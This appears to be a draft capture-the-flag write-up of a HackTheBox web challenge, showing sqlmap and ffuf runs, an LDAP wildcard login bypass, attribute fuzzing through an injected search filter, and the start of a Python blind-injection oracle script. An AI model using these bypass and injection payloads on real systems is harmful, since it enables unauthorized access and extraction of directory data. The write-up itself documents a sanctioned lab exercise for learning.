---
title: "HTB Challenges: Phonebook"
date: 2026-06-23 # YYYY-MM-DD
lastMod: 2026-06-24
summary: "A neat web challenge focused around LDAP injection in an internal phonebook application."
draft: true
# series: ["HTB Challenges: Web"]
# seriesOrder: 1
categories: ["HTB", "hacking"]
tags: ["appsec", "htb", "websec", "hacking"]
---

## 0x00: Intro

Placeholder.

## 0x01: Bypass

First step was to try a SQL injection bypass, since that's what I've been working on lately
```console
$ sqlmap -r login.req --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:28:19 /2026-06-23/

[10:28:19] [INFO] parsing HTTP request from 'login.req'
[10:28:19] [INFO] testing connection to the target URL
got a 302 redirect to 'http://154.57.164.70:32148/login?message=Authentication%20failed'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[10:28:20] [INFO] testing if the target URL content is stable
[10:28:20] [WARNING] POST parameter 'username' does not appear to be dynamic
[10:28:21] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable

[...]
```

As you can see, that was a no-go

Did a bit of fuzzing to find my way to this
Tried the Auth Bypass list from payloadsallthethings, ended up seeing a bunch of 500's among the 302's, filtered
```console
$ ffuf -u 'http://154.57.164.70:32148/login' -X POST -d "username=testFUZZ&password=test" -H 'Content-Type: application/x-www-form-urlencoded' -w ~/Downloads/Auth_Bypass.txt -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.70:32148/login
 :: Wordlist         : FUZZ: /home/vagrant/Downloads/Auth_Bypass.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=testFUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

") or ("x")=("x         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 124ms]
')) or (('x'))=(('x     [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 130ms]
")) or (("x"))=(("x     [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 146ms]
') or true--            [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 159ms]
') or ('x')=('x         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 188ms]
") or true--            [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 205ms]
admin') or ('1'='1      [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 113ms]

[...]

admin") or "1"="1"/*    [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 135ms]
:: Progress: [78/78] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Noticed that there was a common thing among all of them - the `)` character

If you've ever messed with LDAP authentication, you'll know that's a special character

That opens the door a bit - let's try a simple auth bypass

```
POST /login HTTP/1.1
Host: 154.57.164.70:32148
Content-Length: 21
Content-Type: application/x-www-form-urlencoded

username=*&password=*

-----------

HTTP/1.1 302 Found
Location: /
Set-Cookie: mysession=MTc4MjIyNzc0OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fA6QxAV5XDKO0I5vA1YFE1eJLpuSG6utae3GfZdVhD81; Path=/; Expires=Thu, 23 Jul 2026 15:15:49 GMT; Max-Age=2592000
Date: Tue, 23 Jun 2026 15:15:49 GMT
Content-Length: 0
```

## 0x02: Searching

Now that we have a cookie, we can either do the auth bypass in-browser by entering `*` in both fields or just add the cookie, dealer's choice

Presents access to a search field that gives us a request like this:
```
POST /search HTTP/1.1
Host: 154.57.164.70:32148
Content-Length: 15
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: mysession=MTc4MjIyNTgwMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fGuaTTTAtJmBHV92Oc3MLiLHWaO-mu6YmTW2sXaUKBh9
Connection: keep-alive

{"term":"test"}

-----------

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Tue, 23 Jun 2026 15:18:37 GMT
Content-Length: 2

[]
```

Played with the term a bit, tried SQLi (again on my mind) and then flipped back to trying LDAP characters:
```
POST /search HTTP/1.1
Host: 154.57.164.70:32148
Content-Length: 13
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: mysession=MTc4MjIyNTgwMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fGuaTTTAtJmBHV92Oc3MLiLHWaO-mu6YmTW2sXaUKBh9
Connection: keep-alive

{"term":"a*"}

-----------

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 23 Jun 2026 15:26:58 GMT
Content-Length: 8961

[
    {"cn":"Ellery","homePhone":"317-959-9562","mail":"ehun1z@reddit.com","sn":"Hun"},
    {"cn":"Madelaine","homePhone":"636-918-1006","mail":"mlush5@deliciousdays.com","sn":"Lush"},
    { [...] }
]
```

Now it's time to fuzz for LDAP attributes that are valid - I first ran the same fuzz below, but noticed all of the results came back at a lenght of `1986` - and so added the `-fs 1986` to strip out those.

[LDAP Attributes from PayloadsAllTheThings GH](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
```console
$ ffuf -u 'http://154.57.164.70:32148/search' -X POST -d '{"term":"a)(FUZZ=a*"}' -H 'Cookie: mysession=MTc4MjIyNTgwMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fGuaTTTAtJmBHV92Oc3MLiLHWaO-mu6YmTW2sXaUKBh9' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -w ~/Downloads/LDAP_attributes.txt -fs 1986

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.70:32148/search
 :: Wordlist         : FUZZ: /home/vagrant/Downloads/LDAP_attributes.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Header           : Cookie: mysession=MTc4MjIyNTgwMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fGuaTTTAtJmBHV92Oc3MLiLHWaO-mu6YmTW2sXaUKBh9
 :: Data             : {"term":"a)(FUZZ=a*"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1986
________________________________________________

cn                      [Status: 200, Size: 2625, Words: 3, Lines: 1, Duration: 123ms]
sn                      [Status: 200, Size: 2253, Words: 2, Lines: 1, Duration: 127ms]
name                    [Status: 200, Size: 2892, Words: 3, Lines: 1, Duration: 131ms]
surname                 [Status: 200, Size: 2253, Words: 2, Lines: 1, Duration: 141ms]
uid                     [Status: 200, Size: 2625, Words: 3, Lines: 1, Duration: 143ms]
mail                    [Status: 200, Size: 2625, Words: 3, Lines: 1, Duration: 154ms]
commonName              [Status: 200, Size: 2625, Words: 3, Lines: 1, Duration: 156ms]
:: Progress: [27/27] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Now we have the attributes - we can see `cn`, `sn`, `homePhone`, and `mail` in the responses; my next guess was on UID being the likely candidate for holding the flag

We can reduce the query to `Kyle)(uid=a*` and check if the character is valid, and then write a script for it
- Why Kyle? Just need a single result to tell if true, if false shows all results

{{< tabs >}}

    {{< tab label="Python" >}}

    First, let's set up a script that verifies the queries we know - `uid=*` as True, `uid=a*` as false

    ```python
    #!/usr/bin/env python3
import requests, json

url = 'http://154.57.164.74:31485/search'

def oracle(q) -> bool:
    data = {"term": q}
    headers = {
            'Content-Type': 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'mysession=MTc4MjIyNTgwMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fGuaTTTAtJmBHV92Oc3MLiLHWaO-mu6YmTW2sXaUKBh9'
    }
    r = requests.post(
            url,
            json = data,
            headers =  headers,
            proxies = {
                'http': 'http://localhost:8080'
            }
    )
    if r.headers['Content-Length'] == '80':
        return True
    return False

def main():
    assert oracle("Kyle)(uid=*")
    assert not oracle("Kyle)(uid=a*")

if __name__ == "__main__":
    main()

    ```

    {{< /tab >}}

    {{< tab label="Golang" >}}

    ```go
    package main

    func main() {
        println("To be written!")
    }
    ```

    {{< /tab >}}

{{< /tabs >}}